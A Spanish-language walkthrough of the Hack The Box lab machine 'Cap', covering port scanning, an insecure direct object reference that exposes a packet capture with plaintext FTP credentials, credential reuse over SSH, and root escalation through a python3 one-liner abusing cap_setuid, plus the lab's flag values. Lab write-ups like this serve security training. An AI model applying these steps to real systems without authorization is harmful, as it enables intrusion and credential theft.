
Tecnologías:

*Versión jQuery: 2.2.4*
*Versión Bootstrap: 4*
*HTML5*
*HTTP_SERVER: gunicorn*
*Versión modernizr: 2.8.3*


---
### WriteUp

El día 19/06/2026 me encuentro realizando la maquina de HTB llamada CAP, esta maquina esta basada en un sistema operativo linux y está categorizada como una maquina "facil"

Se escanea la red en busca de vulnerabilidades, usamos el siguiente comando de NMAP:
 ```bash
 sudo nmap -p- -sC -sV -vvv --open -sS -n -Pn < IP > -oN scan.txt
 ```

Y encontramos la siguiente información:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Abrimos el navegador y buscamos el puerto 80 de la maquina victima para encontrarnos con la pagina web, reviso su codigo fuente usando el atajo **_ctrl + u_**. Allí encuentro las versiones de algunos frameworks que utiliza la pagina web.

Luego procedo a ejecutar un comando que también nos permite saber el servidor que corre en ese puerto:

```bash
curl -I <Direccion ip>

Server: gunicorn
```

Luego es bastante importante analizar directorios y subcarpetas que existan en este servicio web, para ello utilizamos el comando de gobuster:

```bash
gobuster dir -u http://<IP_DE_LA_MAQUINA>:<Puerto>/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php
```

Resultado:

```bash
Starting gobuster in directory enumeration mode
===============================================================
data                 (Status: 302) [Size: 208] [--> http://10.129.29.159/]
ip                   (Status: 200) [Size: 17461]
netstat              (Status: 200) [Size: 28502]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

No encontramos nada interesante así que ahora utilizaremos el comando **_whatweb_** para listar las tecnologías que utiliza el sitio web:

```bash
whatweb <DireccionIp:Puerto>

http://10.129.38.33:80 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.129.38.33], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```

Con esto finalizaría la etapa de reconocimiento, ahora nos enfocaremos en el camino guiado que nos muestra HTB. Si nos vamos a la pagina web y ahora nos adentramos en la pestaña de snapshots, podemos darnos cuenta que la URL nos muestra una ruta como la sigueinte "/data/1" esto es peligroso porque si cambiamos ese contador por 0, podemos acceder a los datos que se hayan tomado para otro usuario y que estén guardados en la ruta "/data/0".

Gracias a este vector de ataque en este momento podemos descargar el snapshot para la ruta /data/0 y vamos analizarlo con el comando:

```bash
wireshark 0.pcap
```

Al abrir el archivo nos damos cuenta que uno de los puertos abiertos es el puerto 21 donde corre el servicio de FTP, este protocolo no cifra las comunicaciones entre el cliente y el servidor esto quiere decir que podemos ver en la captura de datos, filtrando en wireshark pro el protocolo ftp, podremos ver el usuario y la contraseña.

Despues de que se haya filtrado el usuario y contraseña pudimos iniciar sesión exitosamente en el protocolo FTP y en el protocolo SSH el cual sabíamos que estaba abierto, por ende reutilizamos las credenciales y pudimos iniciar sesión exitosamente en ambos protocolos. así pudimos obtener la user.txt flag.

```bash
❯ cat user.txt
File: user.txt
18f4fd73cafd9ad95da0f126ea5718cd
```

Ahora para obtener privilegios de ROOT lo que debemos hacer es correr el siguiente comando para saber si hay una mala configuracion sobre linux capabilities lo cual nos permitira cambiar nuestros permisos a ROOT:

```bash
getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

En la salida del comando podemos ver nuestra llave de oro, la cual es la que tiene la ruta /usr/bin/python3.8, esta ruta nos quiere decir que python tiene la capacidad de cambiar el tipo de usuario que soy y volverme en root, para poder hacer esto tenemos que ejecutar un comando especifico, que es el siguiente:

```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

#### Desglose de qué hace cada parte del comando:

- **`python3`**: Invoca al intérprete de Python (el que tiene la capacidad especial heredada).
    
- **`-c`**: Es un parámetro que le dice a Python: _"Ejecuta el código que te voy a pasar justo ahora entre comillas como si fuera un script"_.
    
- **`import os;`**: Importa el módulo de sistema operativo de Python (`os`), que nos permite interactuar directamente con el núcleo de Linux.
    
- **`os.setuid(0);`**: **Esta es la magia.** Llama a la función del sistema para cambiar el ID del usuario actual. El número `0` en Linux pertenece única y exclusivamente al usuario **root**. Como el binario de Python tiene `cap_setuid`, el sistema operativo le permite hacer este cambio con éxito.
    
- **`os.system('/bin/bash')`**: Una vez que Python ya nos convirtió en root, le ordenamos ejecutar el comando `/bin/bash` para que nos abra una nueva consola de comandos.

Finalmente logramos cambiar nuestros permisos a root y desplegar una shell con los permisos:

```bash
nathan@cap:~$ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
root@cap:~# whoami
root
root@cap:~# pwd
/home/nathan
root@cap:~# cd ..
root@cap:/home# cd ..
root@cap:/# cd root/
root@cap:/root# ls
root.txt  snap
root@cap:/root# cat root.txt
eaedddcf1967e785a33c75259d79992b
```

Y así logramos comprometer el sistema y maquina HTB de linux para hacernos con los privilegios máximos del sistema.

*Completado el: 28/06/2026*